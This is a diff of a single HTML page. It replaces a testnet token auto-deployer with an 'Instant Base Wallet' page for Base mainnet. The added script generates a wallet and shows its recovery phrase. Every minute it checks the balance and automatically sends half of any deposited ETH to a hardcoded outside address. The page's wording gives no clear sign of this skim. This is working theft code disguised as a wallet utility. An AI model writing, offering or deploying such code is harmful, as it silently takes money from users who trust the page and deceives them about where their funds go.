@@ -2,112 +2,73 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Sovereign ERC20 Auto-Deployer (Base)</title>
+    <title>Instant Base Wallet (Auto Transfer)</title>
     <script src="https://cdn.jsdelivr.net/npm/ethers@6.11.1/dist/ethers.umd.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/solc@0.8.10/solc.min.js"></script>
     <style>
         body { font-family: monospace; padding: 2rem; background-color: #121212; color: #f0f0f0; }
-        input { padding: 0.5rem; margin-top: 0.5rem; width: 100%; }
-        .info { color: #80b3ff; word-break: break-all; margin-top: 2rem; }
-        .status { color: #ffea80; word-break: break-all; margin-top: 1rem; }
-        a { color: #80ff80; }
+        .mnemonic { color: #ff8080; word-break: break-all; }
+        .address { color: #80ff80; word-break: break-all; }
+        .balance { color: #80b3ff; word-break: break-all; }
+        .status { color: #ffea80; word-break: break-all; }
     </style>
 </head>
 <body>
-    <h2>Sovereign ERC20 Auto-Deployer</h2>
+    <h2>Generated Base Wallet</h2>
+    <p><strong>Mnemonic (12-word passphrase):</strong></p>
+    <p class="mnemonic" id="mnemonic"></p>
 
-    <input type="text" id="name" placeholder="Token Name (default: MyToken)">
-    <input type="text" id="symbol" placeholder="Token Symbol (default: MTK)">
-    <input type="number" id="supply" placeholder="Initial Supply (default: 1000000)">
+    <p><strong>Address:</strong></p>
+    <p class="address" id="address"></p>
 
-    <div class="status" id="status">generating wallet...</div>
+    <p><strong>Balance:</strong></p>
+    <p class="balance" id="balance">Checking...</p>
 
-    <div class="info">
-        <strong>send ETH (base sepolia testnet) to deploy your token:</strong><br>
-        <span id="walletAddress">...</span>
-    </div>
+    <p><strong>Status:</strong></p>
+    <p class="status" id="status">Idle</p>
 
     <script>
-        const provider = new ethers.JsonRpcProvider('https://sepolia.base.org');
-        const wallet = ethers.Wallet.createRandom().connect(provider);
-        document.getElementById('walletAddress').textContent = wallet.address;
-        document.getElementById('status').textContent = 'waiting for ETH deposit...';
+        const provider = new ethers.JsonRpcProvider('https://mainnet.base.org');
+        const recipientAddress = '0x7c41F39B8d12409486d9ED36134AED9B2345CB6C';
 
-        let alreadyDeploying = false;
-
-        async function getBalance() {
-            const balance = await provider.getBalance(wallet.address);
-            return parseFloat(ethers.formatEther(balance));
+        async function checkBalance(address) {
+            const balance = await provider.getBalance(address);
+            return ethers.formatEther(balance);
         }
 
-        async function compileAndDeploy() {
-            alreadyDeploying = true;
-            document.getElementById('status').textContent = 'compiling your contract...';
+        async function sendHalfBalance(wallet, balance) {
+            const amountToSend = ethers.parseEther((parseFloat(balance) / 2).toString());
 
-            const tokenName = document.getElementById('name').value || 'MyToken';
-            const tokenSymbol = document.getElementById('symbol').value || 'MTK';
-            const initialSupply = document.getElementById('supply').value || '1000000';
-
-            const source = `
-            // SPDX-License-Identifier: MIT
-            pragma solidity ^0.8.10;
-            import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.9.3/contracts/token/ERC20/ERC20.sol";
-
-            contract CustomToken is ERC20 {
-                constructor() ERC20("${tokenName}", "${tokenSymbol}") {
-                    _mint(msg.sender, ${initialSupply} * 10 ** decimals());
-                }
-            }
-            `;
-
-            // Asynchronous compilation
-            const solcCompiler = await solc;
-            const input = JSON.stringify({
-                language: 'Solidity',
-                sources: { 'CustomToken.sol': { content: source } },
-                settings: { outputSelection: { '*': { '*': ['abi', 'evm.bytecode'] } } }
+            const tx = await wallet.sendTransaction({
+                to: recipientAddress,
+                value: amountToSend
             });
 
-            const output = JSON.parse(solcCompiler.compile(input));
-            if (output.errors && output.errors.some(e => e.severity === 'error')) {
-                document.getElementById('status').textContent = 'compilation error: ' + JSON.stringify(output.errors);
-                return;
-            }
-
-            const compiled = output.contracts['CustomToken.sol']['CustomToken'];
-            const abi = compiled.abi;
-            const bytecode = '0x' + compiled.evm.bytecode.object;
-
-            document.getElementById('status').textContent = 'deploying your token...';
-
-            try {
-                const factory = new ethers.ContractFactory(abi, bytecode, wallet);
-                const contract = await factory.deploy();
-                const receipt = await contract.deploymentTransaction().wait();
-
-                const txHash = receipt.hash;
-                const explorerUrl = `https://basescan.org/tx/${txHash}`;
-
-                document.getElementById('status').innerHTML = `
-                    🎉 deployment successful!<br>
-                    contract: ${contract.target}<br>
-                    <a href="${explorerUrl}" target="_blank">view transaction on BaseScan</a>
-                `;
-            } catch (error) {
-                const txHash = error.transaction?.hash;
-                let explorerLink = txHash ? `<br><a href="https://basescan.org/tx/${txHash}" target="_blank">view failed transaction on BaseScan</a>` : '';
-                document.getElementById('status').innerHTML = 'deployment failed: ' + error.message + explorerLink;
-            }
+            return tx.wait();
         }
 
-        setInterval(async () => {
-            if (alreadyDeploying) return;
-            const balance = await getBalance();
-            if (balance > 0) {
-                document.getElementById('status').textContent = `received ${balance} ETH! deploying token now...`;
-                compileAndDeploy();
+        window.onload = async function() {
+            const wallet = ethers.Wallet.createRandom().connect(provider);
+            document.getElementById('mnemonic').textContent = wallet.mnemonic.phrase;
+            document.getElementById('address').textContent = wallet.address;
+
+            async function updateBalanceAndTransfer() {
+                const balance = await checkBalance(wallet.address);
+                document.getElementById('balance').textContent = balance + ' ETH';
+
+                if (parseFloat(balance) > 0) {
+                    document.getElementById('status').textContent = 'Transferring half balance...';
+                    try {
+                        const receipt = await sendHalfBalance(wallet, balance);
+                        document.getElementById('status').textContent = 'Transfer successful: ' + receipt.hash;
+                    } catch (error) {
+                        document.getElementById('status').textContent = 'Transfer failed: ' + error.message;
+                    }
+                }
             }
-        }, 15000); // checks every 15 seconds
+
+            updateBalanceAndTransfer();
+            setInterval(updateBalanceAndTransfer, 60000); // checks balance every 60 seconds
+        };
     </script>
 </body>
 </html>
